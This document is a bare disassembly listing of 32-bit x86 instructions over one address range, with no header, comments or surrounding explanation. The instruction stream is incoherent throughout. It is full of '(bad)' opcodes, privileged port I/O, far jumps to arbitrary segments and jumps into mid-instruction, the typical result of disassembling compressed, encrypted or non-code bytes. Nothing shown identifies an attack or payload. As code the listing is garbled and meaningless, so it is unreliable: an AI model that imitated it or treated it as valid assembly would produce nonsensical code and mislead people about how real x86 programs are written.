  4166df:	imul   esi,DWORD PTR [edi],0xffffffd7
  4166e2:	clc    
  4166e3:	fsubr  QWORD PTR [edi]
  4166e5:	pusha  
  4166e6:	int    0x30
  4166e8:	arpl   bx,dx
  4166ea:	dec    edx
  4166eb:	mov    esp,0xf7eba99e
  4166f0:	daa    
  4166f1:	popa   
  4166f2:	push   0xc2d8c053
  4166f7:	xchg   esi,eax
  4166f8:	and    eax,0xcc57e7bb
  4166fd:	repz popa 
  4166ff:	sub    DWORD PTR [edi],edi
  416701:	call   0xa150:0x134f30cc
  416708:	mov    ah,0x1b
  41670a:	cmp    edx,DWORD PTR [esi+0x7335108d]
  416710:	push   edx
  416711:	mov    ds:0x3a1ee3e1,al
  416716:	repz fld TBYTE PTR [edx]
  416719:	add    cl,ch
  41671b:	mov    al,ds:0xf2640ec6
  416720:	or     esp,ebx
  416722:	mul    edi
  416724:	pop    esi
  416725:	mov    ds:0x4f88f611,eax
  41672a:	out    0xe4,eax
  41672c:	(bad)  
  41672d:	pusha  
  41672e:	xchg   ebx,eax
  41672f:	fucom  st(3)
  416731:	or     al,0x87
  416733:	jecxz  0x416744
  416735:	mov    eax,ds:0xd0e77beb
  41673a:	pop    ebp
  41673b:	sbb    eax,0x73fb9111
  416740:	ret    
  416741:	push   ecx
  416742:	add    eax,DWORD PTR [ebx+0x1eae07b2]
  416748:	mov    ecx,0x5e62ea23
  41674d:	jo     0x416709
  41674f:	and    eax,0xb007d5ec
  416754:	fst    QWORD PTR [edx-0x23]
  416757:	enter  0x131c,0x4e
  41675b:	cli    
  41675c:	cmp    BYTE PTR [edi+ebx*8],ch
  41675f:	loope  0x416794
  416761:	xlat   BYTE PTR ds:[ebx]
  416762:	lods   al,BYTE PTR ds:[esi]
  416763:	rdmsr  
  416765:	dec    ebx
  416766:	cs mov ebx,0x8e35fbfe
  41676c:	pop    es
  41676d:	popa   
  41676e:	jle    0x416710
  416770:	or     ebx,DWORD PTR [esi]
  416772:	out    0x65,eax
  416774:	es dec ecx
  416776:	in     al,dx
  416777:	dec    edi
  416778:	out    0xfa,eax
  41677a:	push   ebp
  41677b:	sbb    eax,0x13c44155
  416780:	push   0xa818ec61
  416785:	aas    
  416786:	nop
  416787:	rcr    BYTE PTR [edx+0x5e524d00],1
  41678d:	dec    edx
  41678e:	mov    al,BYTE PTR [ebx+ecx*1]
  416791:	dec    eax
  416792:	ss mov bl,0x25
  416795:	scas   eax,DWORD PTR es:[edi]
  416796:	(bad)  
  416797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416798:	cld    
  416799:	xchg   esp,eax
  41679a:	pop    edi
  41679b:	ss xchg edi,eax
  41679d:	loopne 0x416782
  41679f:	ds iret 
  4167a1:	or     ebp,ebp
  4167a3:	jl     0x4167a4
  4167a5:	icebp  
  4167a6:	leave  
  4167a7:	sub    al,0x9e
  4167a9:	popa   
  4167aa:	inc    edx
  4167ab:	out    dx,al
  4167ac:	ret    0xae60
  4167af:	jb     0x416828
  4167b1:	imul   esi,DWORD PTR [eax-0x1166afaf],0xffffffa6
  4167b8:	pop    ecx
  4167b9:	rol    DWORD PTR [esi-0x3c],0x93
  4167bd:	test   BYTE PTR [ebp-0x5ad6795f],bl
  4167c3:	cld    
  4167c4:	outs   dx,DWORD PTR ds:[esi]
  4167c5:	enter  0xbf51,0xea
  4167c9:	cmc    
  4167ca:	in     eax,dx
  4167cb:	inc    edx
  4167cc:	add    edi,DWORD PTR ds:0x40101e72
  4167d2:	pop    esi
  4167d3:	mov    al,0x3c
  4167d5:	popa   
  4167d6:	enter  0xa323,0xc9
  4167da:	ret    0xeef8
  4167dd:	pop    edi
  4167de:	out    0x15,eax
  4167e0:	dec    esi
  4167e1:	jb     0x416852
  4167e3:	in     eax,0xe
  4167e5:	outs   dx,DWORD PTR ds:[esi]
  4167e6:	jmp    0x97e:0x5b60b6e8
  4167ed:	jge    0x41681c
  4167ef:	imul   esp,DWORD PTR [edx+0x39],0x455754ee
  4167f6:	das    
  4167f7:	mov    al,ds:0xa1059bc8
  4167fc:	xor    DWORD PTR [eax+0x27094f5a],ebx
  416802:	in     al,dx
  416803:	xor    DWORD PTR [ebx-0x6c],ebp
  416806:	sbb    BYTE PTR [edx+0x63],bh
  416809:	mov    dh,0x93
  41680b:	shl    cl,1
  41680d:	cmp    eax,0xe8fc2da0
  416812:	fs push eax
  416814:	fwait
  416815:	pop    esi
  416816:	cmp    DWORD PTR [edx-0x6f15e329],ebx
  41681c:	(bad)  
  41681d:	in     al,dx
  41681e:	xor    DWORD PTR [edx],esi
  416820:	pop    esi
  416821:	retf   
  416822:	hlt    
  416823:	xchg   ebp,eax
  416824:	push   edx
  416825:	mov    al,ds:0x5a623855
  41682a:	test   eax,0x994736fa
  41682f:	mov    eax,ds:0xe89add45
  416834:	pop    esi
  416835:	and    al,BYTE PTR [edx]
  416837:	sub    eax,0xd431e66c
  41683c:	gs dec edx
  41683e:	pop    edi
  41683f:	sbb    dl,BYTE PTR [edx+0x185d6a59]
  416845:	sar    DWORD PTR [ecx-0x10a69f21],1
  41684b:	in     al,0x2a
  41684d:	(bad)  
  41684e:	loop   0x4167f7
  416850:	das    
  416851:	add    eax,0x4147f13e
  416856:	pop    eax
  416857:	mov    ds:0xcba800cf,al
  41685c:	ret    0x9c21
  41685f:	jle    0x4168da
  416861:	mov    ebp,0x328ca856
  416866:	out    dx,al
  416867:	or     BYTE PTR [edx-0x42a7c10a],dl
  41686d:	packuswb mm1,QWORD PTR [esi-0x1e7c0f9a]
  416874:	jge    0x41680c
  416876:	mov    cl,0xb2
  416878:	test   eax,0x5ed0e140
  41687d:	or     al,0x38
  41687f:	mov    esi,DWORD PTR [edx-0x35]
  416882:	pop    esi
  416883:	jmp    0x16b8:0x58a768b7
  41688a:	mov    esi,0xb5606c57
  41688f:	xchg   edi,eax
  416890:	jmp    0x4168c1
  416892:	inc    ecx
  416893:	sub    edi,ebp
  416895:	push   ebp
  416896:	out    dx,al
  416897:	loope  0x416908
  416899:	dec    eax
  41689a:	lss    edi,FWORD PTR [ebx+0x90113cf]
  4168a1:	mov    ebp,0x3e6d3d29
  4168a6:	in     eax,dx
  4168a7:	sub    al,0xa2
  4168a9:	or     eax,0x8220f781
  4168ae:	push   cs
  4168af:	(bad)  
  4168b1:	popa   
  4168b2:	call   0xdaff4072
  4168b7:	xchg   esp,eax
  4168b8:	shl    DWORD PTR [edi-0x12],0x7e
  4168bc:	stos   BYTE PTR es:[edi],al
  4168bd:	mov    ecx,0x490c2134
  4168c2:	xor    eax,0x1ea6fba1
  4168c7:	fidivr DWORD PTR [eax+0x5e096778]
  4168cd:	jge    0x41692f
  4168cf:	pop    es
  4168d0:	push   es
  4168d1:	das    
  4168d2:	adc    eax,0xf559e7c2
  4168d7:	cs test al,0xf8
  4168da:	imul   esi,ecx,0x63408f07
  4168e0:	pop    esi
  4168e1:	(bad)  
  4168e2:	and    al,0x18
  4168e4:	mov    ecx,0x6ca9f99
  4168e9:	and    eax,DWORD PTR [ecx+eiz*4+0x6daa6480]
  4168f0:	mov    esi,0x65b69e0e
  4168f5:	mov    eax,DWORD PTR [esi-0x42]
  4168f8:	sbb    eax,0x23217352
  4168fd:	jb     0x4168b9
  4168ff:	cmp    al,0xd0
  416901:	pusha  
  416902:	push   ds
  416903:	das    
  416904:	cli    
  416905:	or     DWORD PTR [eax-0x115f0615],esi
  41690b:	or     DWORD PTR [edi+0xa15622b],0x5ba0ce96
  416915:	jge    0x4168db
  416917:	(bad)
  41691a:	xchg   edx,eax
  41691b:	popa   
  41691c:	push   edx
  41691d:	push   ds
  41691e:	sbb    DWORD PTR [edi+0x5d6e3a13],edx
  416924:	adc    edi,DWORD PTR [eax+eiz*4]
  416927:	and    BYTE PTR [ecx+edx*2-0x3233d8b1],0xe9
  41692f:	jle    0x41693c
  416931:	mov    eax,ds:0x883a0437
  416936:	add    DWORD PTR [ecx],0xa24ec2b0
  41693c:	into   
  41693d:	int3   
  41693e:	fxch   st(5)
  416940:	jl     0x4168c2
  416942:	mov    edx,0xee36f754
  416947:	ja     0x4169c1
  416949:	sbb    eax,0xedaf56e
  41694e:	sbb    esp,DWORD PTR [ecx+0x2d4250cf]
  416954:	add    ecx,DWORD PTR [edx-0x18a66363]
  41695a:	in     eax,0x34
  41695c:	rcr    bl,cl
  41695e:	xor    DWORD PTR cs:[ecx],0xffffffc0
  416962:	pop    eax
  416963:	mov    eax,ds:0x86941051
  416968:	in     al,0x9
  41696a:	push   ebx
  41696b:	pop    ebx
  41696c:	pop    ebx
  41696d:	jmp    0x445d:0x354673a8
  416974:	popf   
  416975:	pop    ds
  416976:	push   esi
  416977:	pop    edx
  416978:	loop   0x4169d3
  41697a:	and    al,0x16
  41697c:	mov    ecx,0x6e217ea0
  416981:	mov    eax,0x266c74f2
  416986:	in     eax,dx
  416987:	dec    ecx
  416988:	or     bh,dh
  41698a:	pop    ss
  41698b:	cld    
  41698c:	jmp    0x46a2c877
  416991:	popa   
  416992:	add    eax,0xbb84cecf
  416997:	rep outs dx,DWORD PTR ds:[esi]
  416999:	xchg   ebp,eax
  41699a:	out    dx,al
  41699b:	frstor [ebx+0x7484d3b3]
  4169a1:	(bad)
  4169a4:	addr16 push ebp
  4169a6:	xchg   ebx,eax
  4169a7:	std    
  4169a8:	fimul  WORD PTR [ebx]
  4169aa:	ficomp DWORD PTR [edi]
  4169ac:	scas   al,BYTE PTR es:[edi]
  4169ad:	sbb    esp,DWORD PTR [eax]
  4169af:	xchg   esp,eax
  4169b0:	cwde   
  4169b1:	repnz xchg esp,eax
  4169b3:	adc    BYTE PTR ds:0x9ac34a5a,dh
  4169b9:	imul   ebp,DWORD PTR ds:0xae8c5fb2,0x34
  4169c0:	test   eax,0xefa40e00
  4169c5:	push   edi
  4169c6:	ja     0x4169b8
  4169c8:	repnz xor al,BYTE PTR [esi-0x59]
  4169cc:	and    BYTE PTR [ebx-0x9],bh
  4169cf:	adc    DWORD PTR [esp+edi*1-0x12],0xcad09bfa
  4169d7:	jl     0x416a17
  4169d9:	popa   
  4169da:	adc    al,0xe7
  4169dc:	fsub   st(6),st
  4169de:	ret    
  4169df:	pop    edx
  4169e0:	xchg   esp,eax
  4169e1:	inc    edx
  4169e2:	lock pop ds
  4169e4:	and    al,0xc5
  4169e6:	in     eax,0x1
  4169e8:	pop    es
  4169e9:	nop
  4169ea:	call   0xa92a:0x5a606b42
  4169f1:	cmc    
  4169f2:	test   DWORD PTR [edi+0x1aee7b04],ebx
  4169f8:	jo     0x4169e8
  4169fa:	mov    WORD PTR [edi+0x54],ds
  4169fd:	mov    al,ds:0xf160a0ae
  416a02:	sti    
  416a03:	push   ebx
  416a04:	(bad)  
  416a06:	(bad)  
  416a07:	fcomp  DWORD PTR [edi-0x6b]
  416a0a:	dec    ebp
  416a0b:	sub    DWORD PTR [esi+edi*1-0x10],ebx
  416a0f:	sbb    BYTE PTR [edi],ah
  416a11:	(bad)  [edi-0x5f]
  416a14:	add    edi,DWORD PTR [esi+0x3a]
  416a17:	mov    ah,0xdb
  416a19:	(bad)  
  416a1b:	adc    ebx,DWORD PTR [esi+0x2b]
  416a1e:	hlt    
  416a1f:	dec    edx
  416a20:	mov    esp,esi
  416a22:	popf   
  416a23:	test   eax,0x2fe60a6
  416a28:	mov    BYTE PTR [edi+esi*8+0x66d009db],dl
  416a2f:	stc    
  416a30:	pop    esi
  416a31:	stc    
  416a32:	mov    bh,0x42
  416a34:	mov    ds:0x8db42af,eax
  416a39:	popa   
  416a3a:	add    eax,0x9cbab4fc
  416a3f:	mov    ds:0x97eb0873,eax
  416a44:	test   edx,0xd7d12a0c
  416a4a:	push   ebp
  416a4b:	fdiv   DWORD PTR [ebp-0x56]
  416a4e:	inc    edx
  416a4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a50:	xor    eax,0xd269d361
  416a55:	adc    DWORD PTR [eax-0x11402081],edx
  416a5b:	push   edi
  416a5c:	addr16 stc 
  416a5e:	xchg   ebp,eax
  416a5f:	cwde   
  416a60:	push   es
  416a61:	dec    ebp
  416a62:	or     al,0xf5
  416a64:	sbb    al,0x61
  416a66:	cs jmp 0x416a30
  416a69:	inc    ebp
  416a6a:	cmc    
  416a6b:	ds and edi,ebp
  416a6e:	out    dx,al
  416a6f:	and    esp,eax
  416a71:	add    al,dh
  416a73:	loop   0x416a50
  416a75:	lds    edx,FWORD PTR [edi]
  416a77:	mov    eax,ds:0xd9ae284c
  416a7c:	retf   0x6de7
  416a7f:	pop    es
  416a80:	hlt    
  416a81:	pop    edx
  416a82:	in     eax,dx
  416a83:	xchg   BYTE PTR [eax-0x76167b14],bl
  416a89:	jl     0x416ae5
  416a8b:	push   edi
  416a8c:	xor    al,0x61
  416a8e:	fchs   
  416a90:	out    dx,eax
  416a91:	sahf   
  416a92:	mul    cl
  416a94:	push   edx
  416a95:	(bad)  
  416a96:	out    dx,al
  416a97:	iret   
  416a98:	jp     0x416abc
  416a9a:	push   ss
  416a9b:	xchg   ebp,eax
  416a9c:	inc    ebx
  416a9d:	xchg   ebx,eax
  416a9e:	lods   al,BYTE PTR ds:[esi]
  416a9f:	mov    al,ds:0x2ac51431
  416aa4:	inc    edi
  416aa5:	stos   BYTE PTR es:[edi],al
  416aa6:	pop    edx
  416aa7:	lahf   
  416aa8:	pop    esi
  416aa9:	mov    bl,0xfd
  416aab:	fdivr  DWORD PTR [ecx-0x756914cb]
  416ab1:	pop    edi
  416ab2:	js     0x416abb
  416ab4:	adc    ebx,DWORD PTR [ebx]
  416ab6:	je     0x416b21
  416ab8:	xchg   edx,eax
  416ab9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416aba:	in     al,0xd6
  416abc:	jbe    0x416b3c
  416abe:	out    dx,al
  416abf:	add    DWORD PTR [ecx+0x2e],0x8f878399
  416ac6:	jle    0x416b3d
  416ac8:	rcl    DWORD PTR [edx-0x64],1
  416acb:	and    al,0xae
  416acd:	or     BYTE PTR [ebx],0xaf
  416ad0:	enter  0x367c,0xe3
  416ad4:	push   edx
  416ad5:	sub    esi,0x47
  416ad8:	int3   
  416ad9:	int3   
  416ada:	pop    edx
  416adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416adc:	xlat   BYTE PTR ds:[ebx]
  416add:	cmc    
  416ade:	sahf   
  416adf:	inc    edx
  416ae0:	jae    0x416abb
  416ae2:	push   edx
  416ae3:	(bad)  
  416ae4:	outs   dx,DWORD PTR ds:[esi]
  416ae5:	pusha  
  416ae6:	(bad)  
  416ae8:	mov    al,BYTE PTR [esp+esi*2+0x2d]
  416aec:	in     al,0xfe
  416aee:	in     eax,dx
  416aef:	cli    
  416af0:	ins    BYTE PTR es:[edi],dx
  416af1:	lods   al,BYTE PTR ds:[esi]
  416af2:	and    bl,BYTE PTR [edx-0x8]
  416af5:	ds push cs
  416af7:	lock mov ecx,0x15162a5d
  416afd:	adc    BYTE PTR [edx],al
  416aff:	nop
  416b00:	xchg   BYTE PTR [ebx+esi*8-0x7d],cl
  416b04:	fs icebp 
  416b06:	out    0x2c,al
  416b08:	xchg   BYTE PTR [eax],al
  416b0a:	out    0xf5,al
  416b0c:	cmp    cl,BYTE PTR [esi-0x39]
  416b0f:	lods   eax,DWORD PTR ds:[esi]
  416b10:	inc    ebx
  416b11:	xchg   ecx,eax
  416b12:	loopne 0x416ab7
  416b14:	mov    cl,0xd7
  416b16:	add    al,0xe4
  416b18:	in     al,dx
  416b19:	clc    
  416b1a:	outs   dx,BYTE PTR ds:[esi]
  416b1b:	cmc    
  416b1c:	xchg   edx,eax
  416b1d:	cld    
  416b1e:	jmp    0x416b55
  416b20:	jbe    0x416b6d
  416b22:	lea    edi,[ecx+0x63a7e8e0]
  416b28:	in     eax,0x60
  416b2a:	pop    esp
  416b2b:	sub    al,0xda
  416b2d:	ins    BYTE PTR es:[edi],dx
  416b2e:	push   cs
  416b2f:	xchg   ebx,eax
  416b30:	or     al,0xba
  416b32:	out    dx,eax
  416b33:	pop    es
  416b34:	inc    edi
  416b35:	dec    esp
  416b36:	lds    eax,FWORD PTR [eax+0x7f03ce1a]
  416b3c:	sub    BYTE PTR [ecx+0x62],ah
  416b3f:	lods   eax,DWORD PTR ds:[esi]
  416b40:	pop    es
  416b41:	xor    DWORD PTR [edi],ebp
  416b43:	push   ds
  416b44:	add    esp,ebx
  416b46:	in     eax,dx
  416b47:	into   
  416b48:	mov    ch,0x83
  416b4a:	adc    DWORD PTR [ebx-0x59d1debb],ebx
  416b50:	and    BYTE PTR [eax-0x77],0x1c
  416b54:	(bad)  
  416b55:	or     al,0x64
  416b57:	mov    DWORD PTR [esi+0x5e08e393],esp
  416b5d:	xchg   cx,ax
  416b5f:	mov    dl,0xaa
  416b61:	cmp    dh,BYTE PTR cs:[eax+eax*8]
  416b65:	pusha  
  416b66:	push   DWORD PTR [edx+edx*1-0x20]
  416b6a:	jnp    0x416bc8
  416b6c:	mov    dh,0x75
  416b6e:	out    dx,al
  416b6f:	jmp    0xabd:0xd660cfd2
  416b76:	xor    eax,0x7135e5a1
  416b7b:	and    dh,bl
  416b7d:	(bad)  
  416b7e:	xlat   BYTE PTR ds:[ebx]
  416b7f:	(bad)  
  416b80:	es ins DWORD PTR es:[edi],dx
  416b82:	dec    esi
  416b83:	mov    eax,ds:0x397dea76
  416b88:	sub    esi,DWORD PTR [ebp+0x5f26a0de]
  416b8e:	mov    ch,0xa6
  416b90:	push   edx
  416b91:	stos   DWORD PTR es:[edi],eax
  416b92:	push   ss
  416b93:	cmp    BYTE PTR [ebp+0x5c],bl
  416b96:	and    BYTE PTR [ecx-0x35],al
  416b99:	out    dx,al
  416b9a:	loopne 0x416b35
  416b9c:	jbe    0x416b3b
  416b9e:	pop    es
  416b9f:	mov    eax,ds:0x29df5444
  416ba4:	adc    BYTE PTR ss:[eax-0x4594a1bf],bh
  416bab:	jecxz  0x416b65
  416bad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bae:	dec    edx
  416baf:	pop    DWORD PTR [ebx+0x78f19960]
  416bb5:	jge    0x416b6c
  416bb7:	mov    edi,0x5601d4ac
  416bbc:	ja     0x416bdd
  416bbe:	jo     0x416b57
  416bc0:	mov    esi,0xfd00db11
  416bc5:	icebp  
  416bc6:	xchg   edx,eax
  416bc7:	int    0x14
  416bc9:	popa   
  416bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bcb:	push   ebp
  416bcc:	loope  0x416b6e
  416bce:	out    dx,eax
  416bcf:	xchg   edi,eax
  416bd0:	test   BYTE PTR [edx-0x1c],bl
  416bd3:	(bad)  
  416bd4:	pop    esi
  416bd5:	repz sbb DWORD PTR [edx-0x5d],esi
  416bd9:	cmp    DWORD PTR [ebx],edi
  416bdb:	push   edx
  416bdc:	shl    DWORD PTR [eax+0x34],cl
  416bdf:	bound  edi,QWORD PTR [edi+0x25]
  416be2:	icebp  
  416be3:	jbe    0x416b68
  416be5:	pop    edx
  416be6:	outs   dx,DWORD PTR es:[esi]
  416be8:	mov    cl,0xd2
  416bea:	xchg   ebp,eax
  416beb:	push   es
  416bec:	mov    esp,DWORD PTR [eax]
  416bee:	add    esi,DWORD PTR [eax+0x52]
  416bf1:	nop
  416bf2:	jns    0x416b95
  416bf4:	add    bl,ch
  416bf6:	push   edx
  416bf7:	(bad)  
  416bf8:	adc    ah,BYTE PTR [eax+edx*4-0x25]
  416bfc:	pop    esi
  416bfd:	sub    ebx,DWORD PTR [edi-0x7ece11d8]
  416c03:	adc    eax,0x52
  416c06:	popa   
  416c07:	dec    edi
  416c08:	cmp    ah,BYTE PTR [ecx+0x5888bcac]
  416c0e:	into   
  416c0f:	push   edi
  416c10:	loope  0x416c24
  416c12:	out    dx,al
  416c13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c14:	xor    eax,0x62f3d58e
  416c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c1a:	dec    esp
  416c1b:	mov    eax,ds:0xf4bf1f50
  416c20:	sub    al,0x32
  416c22:	push   ebx
  416c23:	mov    edi,0xc65c9a4c
  416c28:	pop    esi
  416c29:	imul   edi,DWORD PTR [edx+eiz*2-0x5f268219],0x198b340a
  416c34:	mov    esp,0x5480fe7f
  416c39:	pop    edx
  416c3a:	dec    ebp
  416c3b:	ficomp DWORD PTR [esi+0x49]
  416c3e:	add    ecx,ebx
  416c40:	mov    esi,0x4fa0cc1a
  416c45:	in     al,0x7
  416c47:	push   es
  416c48:	(bad)  
  416c49:	shr    BYTE PTR [esi],1
  416c4b:	pop    esi
  416c4c:	pop    esp
  416c4d:	jo     0x416c9f
  416c4f:	int    0x3
  416c51:	mov    ebx,0x6081f36c
  416c56:	fs or  eax,0x5019ddde
  416c5c:	jns    0x416c1c
  416c5e:	out    dx,al
  416c5f:	lahf   
  416c60:	cmp    bl,ah
  416c62:	js     0x416c3f
  416c64:	jae    0x416c90
  416c66:	jg     0x416c09
  416c68:	xor    ecx,DWORD PTR [edx-0xb]
  416c6b:	rol    DWORD PTR es:[edi+0x755edbc8],1
  416c72:	cmp    al,0xfe
  416c74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c75:	ins    DWORD PTR es:[edi],dx
  416c76:	retf   
  416c77:	push   eax
  416c78:	out    dx,al
  416c79:	pusha  
  416c7a:	push   esi
  416c7b:	xchg   ecx,eax
  416c7c:	inc    ebp
  416c7d:	adc    DWORD PTR [ecx-0x68],edi
  416c80:	pop    ss
  416c81:	cld    
  416c82:	out    dx,al
  416c83:	out    0x98,eax
  416c85:	ss int 0x6e
  416c88:	sbb    ebx,esp
  416c8a:	scas   eax,DWORD PTR es:[edi]
  416c8b:	jne    0x416d07
  416c8d:	(bad)  
  416c8e:	shl    BYTE PTR [eax-0x16843fe4],0x1
  416c95:	sub    eax,0x265e9e07
  416c9a:	xchg   bl,al
  416c9c:	das    
  416c9d:	cmc    
  416c9e:	push   ebp
  416c9f:	dec    eax
  416ca0:	retf   
  416ca1:	sub    esi,ebx
  416ca3:	mov    ds:0x38d07338,eax
  416ca8:	ficomp WORD PTR [edx]
  416caa:	push   ebx
  416cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cac:	xchg   edi,eax
  416cad:	shl    DWORD PTR [esi],1
  416caf:	sub    DWORD PTR [edx-0x5b78117a],ebp
  416cb5:	xchg   edi,eax
  416cb6:	or     eax,DWORD PTR [edi+0x39]
  416cb9:	mov    al,ds:0x36768f1e
  416cbe:	dec    eax
  416cbf:	pop    es
  416cc0:	popaw  
  416cc2:	mov    ds:0x5e5abf6,al
  416cc7:	mov    ds,WORD PTR [esi-0x19]
  416cca:	mov    ss,WORD PTR ds:0xd7f95d0d
  416cd0:	mov    cl,0x44
  416cd2:	inc    eax
  416cd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cd4:	fsub   QWORD PTR [eax-0x4f4fc636]
  416cda:	retf   
  416cdb:	mov    ds,WORD PTR [esi-0x5c]
  416cde:	call   0x6b82:0xf4dc7f97
  416ce5:	pop    ecx
  416ce6:	adc    ecx,DWORD PTR [edx+0x50]
  416ce9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cea:	lods   al,BYTE PTR ds:[esi]
  416ceb:	ror    BYTE PTR [ebp+0x5ef76665],1
  416cf1:	and    esi,0x13
  416cf4:	ficomp WORD PTR ds:0x6296
  416cf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cfa:	fiadd  WORD PTR [eax+0x3dd2612d]
  416d00:	sar    ch,1
  416d02:	fcomp  DWORD PTR [ecx-0x61115228]
  416d08:	mov    esp,0x590cc14d
  416d0d:	or     ecx,ebx
  416d0f:	jb     0x416d0f
  416d11:	pusha  
  416d12:	(bad)  
  416d13:	fmul   DWORD PTR [edx-0x3e]
  416d16:	mov    DWORD PTR [eax-0x4c2757f2],esi
  416d1c:	pop    esi
  416d1d:	sub    BYTE PTR [ebx],0xe4
  416d20:	test   al,0x1f
  416d22:	add    DWORD PTR [eax+0x740557a2],ecx
  416d28:	sti    
  416d29:	or     DWORD PTR [edi-0x5f],ebx
  416d2c:	outs   dx,BYTE PTR ds:[esi]
  416d2d:	js     0x416ccd
  416d2f:	scas   eax,DWORD PTR es:[edi]
  416d30:	clc    
  416d31:	pusha  
  416d32:	xchg   edi,eax
  416d34:	dec    ebx
  416d35:	mov    esp,0x5e318894
  416d3a:	out    dx,al
  416d3b:	adc    edx,DWORD PTR ds:0xa52dabd3
  416d41:	mov    es,WORD PTR [ecx-0x5f]
  416d44:	neg    BYTE PTR [esi+0x64]
  416d47:	jg     0x416da3
  416d49:	mov    DWORD PTR [ebp-0x420fa140],esi
  416d4f:	pop    es
  416d50:	ins    DWORD PTR es:[edi],dx
  416d51:	mov    eax,ecx
  416d53:	mov    cl,0x41
  416d55:	popa   
  416d56:	test   ch,0x62
  416d59:	(bad)  
  416d5a:	jb     0x416db6
  416d5c:	rcr    DWORD PTR [eax],1
  416d5e:	out    dx,al
  416d5f:	sahf   
  416d60:	pushf  
  416d61:	mov    ds:0xcfb374cb,al
  416d66:	jecxz  0x416d08
  416d68:	and    al,0x4a
  416d6a:	out    dx,eax
  416d6b:	mov    ch,BYTE PTR [edx+ecx*4]
  416d6e:	xchg   ebx,eax
  416d6f:	fcomp  DWORD PTR [esi-0x75]
  416d72:	push   edx
  416d73:	ins    DWORD PTR es:[edi],dx
  416d74:	cmp    ch,BYTE PTR [ebx]
  416d76:	test   esp,esp
  416d78:	jl     0x416dd7
  416d7a:	jae    0x416da4
  416d7c:	jbe    0x416d81
  416d7e:	ret    0x961f
  416d81:	inc    ebx
  416d82:	jle    0x416d84
  416d84:	icebp  
  416d85:	or     ebp,ebx
  416d87:	enter  0x885e,0x33
  416d8b:	arpl   WORD PTR [eax+0x1a],bp
  416d8e:	ficom  WORD PTR [edx+0x55]
  416d91:	popa   
  416d92:	loop   0x416d70
  416d94:	ret    
  416d95:	mov    ds:0xa9f0ea98,eax
  416d9a:	in     eax,dx
  416d9b:	adc    eax,0x322342dc
  416da0:	mov    WORD PTR [ebp+0x36],gs
  416da3:	jmp    0x416d2a
  416da5:	bound  esp,QWORD PTR [eax+edx*8]
  416da8:	ficom  WORD PTR [edi]
  416daa:	fdivr  QWORD PTR [ebx+0x480948c4]
  416db0:	push   esp
  416db1:	push   ss
  416db2:	out    0x4c,al
  416db4:	pop    esi
  416db5:	aam    0x8f
  416db7:	jecxz  0x416d72
  416db9:	and    BYTE PTR [eax+0x663bafa1],al
  416dbf:	mov    al,0x26
  416dc1:	jle    0x416d61
  416dc3:	cmp    ebx,DWORD PTR [esi+0x6c]
  416dc6:	adc    al,0x4
  416dc8:	addr16 popf 
  416dca:	cmp    al,al
  416dcc:	push   ecx
  416dcd:	popa   
  416dce:	mov    dl,0x1d
  416dd0:	xchg   edx,eax
  416dd1:	ins    DWORD PTR es:[edi],dx
  416dd2:	jp     0x416e43
  416dd4:	fwait
  416dd5:	lahf   
  416dd6:	lock or bl,0x53
  416dda:	popa   
  416ddb:	popa   
  416ddc:	lahf   
  416ddd:	ror    DWORD PTR [ecx-0x239eaf31],1
  416de3:	dec    esp
  416de4:	dec    edx
  416de5:	xor    BYTE PTR [esp+ecx*8],ah
  416de8:	or     ch,BYTE PTR [eax+esi*8+0x54]
  416dec:	and    BYTE PTR fs:[ebx],ch
  416def:	adc    DWORD PTR [ebp+0x63cf7a91],0x48a2e861
  416df9:	adc    DWORD PTR [ecx-0x78],0x29ee47d5
  416e00:	jo     0x416e6f
  416e02:	loop   0x416e24
  416e04:	ret    0xcbde
  416e07:	mov    al,ds:0x1c2bddb3
  416e0c:	add    al,BYTE PTR [edx]
  416e0e:	jnp    0x416e84
  416e10:	pop    ebp
  416e11:	push   edx
  416e12:	pop    esi
  416e13:	pop    eax
  416e14:	jge    0x416de7
  416e16:	lock cmp al,0x96
  416e19:	cs jmp 0x3fff:0x71f9dea0
  416e21:	aaa    
  416e22:	out    0xef,al
  416e24:	(bad)  
  416e25:	adc    eax,0xf05e91e2
  416e2a:	add    ebx,DWORD PTR [ebx]
  416e2c:	es out 0xb0,al
  416e2f:	push   ss
  416e30:	xchg   DWORD PTR [eax+0x71],ebp
  416e33:	push   0x9b36845e
  416e38:	sbb    ah,BYTE PTR [ebx+0x24]
  416e3b:	aad    0xf8
  416e3d:	jbe    0x416e2d
  416e3f:	out    0x45,eax
  416e41:	dec    esi
  416e42:	xor    al,BYTE PTR [esi]
  416e44:	dec    edx
  416e45:	sbb    ebp,edi
  416e47:	mov    ds:0xd3433356,al
  416e4c:	sbb    al,0xcc
  416e4e:	dec    esi
  416e4f:	xor    al,0x42
  416e51:	pop    esp
  416e52:	jmp    0x416dfd
  416e54:	rol    DWORD PTR [esi],cl
  416e56:	dec    esp
  416e57:	pop    esi
  416e58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e59:	fsub   DWORD PTR [edi-0x5d]
  416e5c:	ins    DWORD PTR es:[edi],dx
  416e5d:	pusha  
  416e5e:	(bad)  
  416e5f:	mov    cl,0xa
  416e61:	pushf  
  416e62:	dec    ecx
  416e63:	dec    edi
  416e64:	and    ecx,ebp
  416e66:	out    dx,al
  416e67:	add    ah,BYTE PTR [ecx+ebp*4]
  416e6a:	fidiv  DWORD PTR [esi]
  416e6c:	(bad)  
  416e6d:	mov    ds:0x2485a0dc,al
  416e72:	sti    
  416e73:	shl    ebp,0x91
  416e76:	out    dx,eax
  416e77:	and    ebx,DWORD PTR [ebx-0x42]
  416e7a:	lds    ebp,FWORD PTR ds:0x5777b07e
  416e80:	(bad)  
  416e81:	das    
  416e82:	inc    edx
